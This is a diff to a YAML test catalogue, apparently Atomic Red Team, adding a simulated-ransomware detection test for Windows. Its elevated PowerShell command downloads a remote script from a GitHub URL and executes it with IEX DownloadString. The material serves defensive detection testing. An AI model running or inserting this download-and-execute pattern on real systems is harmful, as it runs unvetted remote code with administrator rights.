@@ -340,3 +340,23 @@ atomic_tests:
     cleanup_command: |
       del $env:Userprofile\Desktop\akira_readme.txt 
       del c:\test.*.akira
+- name: Simulated Ransomware Activity via PowerShell (No Encryption)
+  auto_generated_guid: d7c92b86-bc7b-4a9b-a445-f1f3f2a8e9e9
+  description: |
+    This test simulates ransomware behavior by searching for specific file types, copying them to a test folder, renaming .txt files, and writing a simulated ransom note on the desktop. 
+    It is safe for testing detection use cases and does not harm original files.
+  supported_platforms:
+  - windows
+  input_arguments:
+    ransom_sim_script_url:
+      description: URL of the PowerShell ransomware simulation script
+      type: url
+      default: https://raw.githubusercontent.com/Moerov/FireSOC/refs/heads/main/utils/ransomtest.ps1
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      IEX (New-Object Net.WebClient).DownloadString("#{ransom_sim_script_url}")
+    cleanup_command: |
+      Remove-Item -Path "C:\RansomwareTest" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path "$env:USERPROFILE\Desktop\RANSOM_NOTE_SIMULATION.txt" -Force -ErrorAction SilentlyContinue
